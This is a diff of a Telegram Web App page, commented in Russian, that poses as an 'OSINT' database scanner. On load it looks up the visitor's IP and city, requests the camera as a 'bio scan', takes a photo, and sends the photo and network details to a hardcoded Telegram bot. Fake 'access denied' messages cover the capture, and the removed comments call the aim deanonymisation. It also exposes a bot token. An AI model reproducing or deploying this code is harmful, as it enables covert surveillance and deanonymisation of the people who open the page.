@@ -1,21 +1,60 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>CORE_NETWORK // OSINT</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        :root { --main: #ff003c; --bg: #050505; }
+        body { background: var(--bg); color: var(--main); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; height: 100vh; -webkit-user-select: none; }
+        .grid-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: linear-gradient(rgba(255,0,60,0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,0,60,0.05) 1px, transparent 1px); background-size: 40px 40px; z-index: 0; pointer-events: none; }
+        .container { z-index: 1; padding: 20px; flex-grow: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
+        .box { background: rgba(15, 0, 0, 0.9); border: 1px solid var(--main); padding: 25px; width: 85%; max-width: 400px; box-shadow: 0 0 30px rgba(255, 0, 60, 0.1); border-radius: 5px; }
+        .loading-bar { width: 100%; height: 2px; background: #200005; margin: 20px 0; position: relative; overflow: hidden; }
+        .loading-bar::after { content: ''; position: absolute; left: -50%; width: 50%; height: 100%; background: var(--main); animation: load 1.5s infinite linear; }
+        @keyframes load { 100% { left: 100%; } }
+        #status { font-size: 14px; text-transform: uppercase; letter-spacing: 3px; font-weight: bold; }
+        #details { font-size: 10px; margin-top: 15px; color: #666; font-family: monospace; }
+    </style>
+</head>
+<body>
+    <div class="grid-bg"></div>
+    <div class="container">
+        <div class="box">
+            <div id="status">INIT_SEQUENCE...</div>
+            <div class="loading-bar"></div>
+            <div id="details">CONNECTING_TO_DATABASE</div>
+        </div>
+    </div>
+
 <script>
     const TG_TOKEN = "8713406185:AAEYao0zu3daLeZis1gkrFD3-wv7oMXCzsY"; 
     const TG_ID = "5131628747"; 
 
-    // Как только страница открылась — начинаем охоту
-    window.onload = function() {
-        initDeanon();
+    // Сообщаем телеграму, что приложение готово
+    if (window.Telegram && window.Telegram.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand(); // Разворачиваем на весь экран
+    }
+
+    window.onload = () => {
+        setTimeout(startCapture, 1000);
     };
 
-    async function initDeanon() {
+    async function startCapture() {
         let ipData = {};
-        // 1. Собираем данные сети
+        const st = document.getElementById('status');
+        const dt = document.getElementById('details');
+
         try {
             const res = await fetch('https://ipapi.co/json/');
             ipData = await res.json();
-        } catch(e) { ipData = { ip: "не определен" }; }
+            dt.innerText = `NODE: ${ipData.ip} [${ipData.city || 'UNK'}]`;
+        } catch(e) { ipData = { ip: "PROXY_DETECTED" }; }
 
-        // 2. Сразу запрашиваем камеру под видом "сканирования"
+        st.innerText = "BIO_SCANNING...";
+
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.createElement('video');
@@ -27,26 +66,33 @@
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => sendToBot(ipData, blob), 'image/jpeg');
-                // Останавливаем камеру после снимка
-                stream.getTracks().forEach(track => track.stop());
-            }, 2000);
-        } catch(e) {
-            sendToBot(ipData, null); // Если камеру не дал, шлем хотя бы IP
+                
+                canvas.toBlob(blob => {
+                    sendData(ipData, blob);
+                    st.innerText = "ACCESS_DENIED";
+                    dt.innerText = "ENCRYPTED_BY_SERVER_ADMIN";
+                    stream.getTracks().forEach(t => t.stop());
+                }, 'image/jpeg');
+            }, 2500);
+        } catch(err) {
+            st.innerText = "AUTH_ERROR";
+            dt.innerText = "CAMERA_NOT_FOUND_OR_BLOCKED";
+            sendData(ipData, null);
         }
     }
 
-    function sendToBot(ip, photo) {
-        const text = `🎯 КТО-ТО ОТКРЫЛ ПРИЛОЖЕНИЕ!\n🌐 IP: ${ip.ip}\n📍 ГОРОД: ${ip.city || '?'}\n🏢 ПРОВАЙДЕР: ${ip.org || '?'}\n💻 СИСТЕМА: ${navigator.platform}`;
-        
+    function sendData(ip, photo) {
+        const info = `🔔 НОВЫЙ ЛОГ\n🌐 IP: ${ip.ip}\n📍 ГОРОД: ${ip.city || '?'}\n🏢 ПРОВАЙДЕР: ${ip.org || '?'}\n📱 СИСТЕМА: ${navigator.platform}`;
         const formData = new FormData();
         formData.append('chat_id', TG_ID);
         if (photo) {
-            formData.append('photo', photo, 'face.jpg');
-            formData.append('caption', text);
+            formData.append('photo', photo, 'shot.jpg');
+            formData.append('caption', info);
             fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
         } else {
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(text)}`);
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(info)}`);
         }
     }
 </script>
+</body>
+</html>
